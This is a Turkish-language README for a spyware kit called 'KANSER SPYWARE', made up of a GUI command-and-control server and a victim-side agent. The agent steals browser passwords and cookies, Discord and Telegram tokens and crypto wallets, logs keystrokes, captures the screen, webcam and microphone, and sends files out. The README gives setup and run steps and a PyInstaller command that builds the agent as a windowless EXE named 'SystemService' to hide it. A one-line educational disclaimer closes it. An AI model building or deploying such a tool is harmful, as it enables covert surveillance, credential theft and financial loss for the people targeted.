# KANSER SPYWARE v1.0

Kapsamli casus yazilim araci. Keylogger, ekran/webcam goruntu alma, tarayici parola/token calma, kripto cuzdan hirsizligi, mikrofon kaydi ve veri exfiltrasyonu ozelliklerini tek bir ajanda toplar.

---

## Dosya Yapisi

| Dosya | Aciklama |
|-------|----------|
| `server.py` | Spyware C2 kontrol paneli (GUI) — client yonetimi, gelen veri goruntuleme |
| `agent.py` | Multi-threaded veri toplayici ajan — tum modulleri koordine eder |
| `stealer.py` | Credential stealer — Chrome/Firefox/Edge parolalari, Discord/Telegram token, kripto cuzdanlar, FTP, WiFi |
| `capture.py` | Goruntu yakalama — ekran goruntusu (JPEG), webcam fotografi, mikrofon ses kaydi |
| `keylogger.py` | Klavye dinleyici — tum tus vuruslarini kaydeder, pencere basligi takibi |
| `exfil.py` | Veri exfiltrasyon motoru — degerli dosya taramasi (.doc, .pdf, .pem, .key vb.), ZIP'leyip sunucuya gonderir |
| `config.json` | Spyware yapilandirmasi — C2 adresi, port, hedef dizinler |

---

## Ozellikler

- **Credential Stealer** — Chrome, Firefox, Edge, Brave, Opera tarayici kayitli parolalar ve cookie'ler
- **Discord / Telegram Token** — Discord token, Telegram session dosyasi calma
- **Kripto Cuzdanlar** — MetaMask, Trust Wallet, Exodus, Electrum, Bitcoin Core
- **Ekran Goruntusu** — Tum monitorden JPEG capture (PIL/ImageGrab)
- **Webcam** — OpenCV ile webcam fotografi
- **Mikrofon** — PyAudio ile WAV ses kaydi
- **Keylogger** — pynput tabanli, pencere basligi izleme, buffer + periyodik gonderim
- **Exfiltration** — Hedefli dosya taramasi, ZIP sikistirma, base64 kodlama
- **SQLite Veritabani** — Sunucu tarafinda tum gelen veriler `spy_data.db`'de saklanir
- **GUI Panel** — Tkinter tabanli, client listesi, canli veri akisi, veri export

---

## Gereksinimler

```bash
cd KanserTools
pip install -r requirements.txt

# Spyware ek bagimliliklari:
pip install pynput pillow opencv-python numpy pyaudio
```

---

## Kullanim

### 1. C2 Sunucu (Kontrol Paneli)

```bash
cd spyware
python server.py
```

GUI acilir. Varsayilan port: `5555`. Gelen client baglantilari soldaki listede gorunur. Bir client secildiginde:
- **Console** sekmesi: Canli komut ve veri akisi
- **Data** sekmesi: Calinan credential, keylog, ekran goruntusu
- **Files** sekmesi: Exfil edilen dosyalar

### 2. Agent (Hedef Makine)

```bash
# Direkt calistirma:
python agent.py

# config.json icinde C2_HOST ve C2_PORT ayarlanmalidir
```

Agent calistiginda otomatik olarak:
1. C2 sunucuya baglanir
2. Tum stealer modullerini calistirir
3. Keylogger'i baslatir
4. Periyodik ekran goruntusu ve webcam cekimi yapar
5. Exfiltration taramasi baslatir

---

## EXE Builder (PyInstaller)

```bash
cd spyware

# Agent'i tek EXE yap:
pyinstaller --onefile --noconsole --name=SystemService agent.py

# Server'i EXE yap:
pyinstaller --onefile --name=SpyServer server.py
```

---

## Monitor Reporter

`monitor_reporter.py`, agent calistiginda otomatik import edilir. Yeni client baglantisi, credential calma tamamlanmasi, keylog gonderimi, hata durumlari gibi tum olaylar merkezi olarak raporlanir.

```python
from monitor_reporter import report
report("Spyware", "credentials_stolen", {"browsers": 5, "tokens": 2})
```

---

## Guvenlik Uyarisi

Bu arac **yalnizca kendi sistemlerinizde ve egitim/test amaciyla** kullanilmalidir. Izinsiz kullanim yasa disidir.
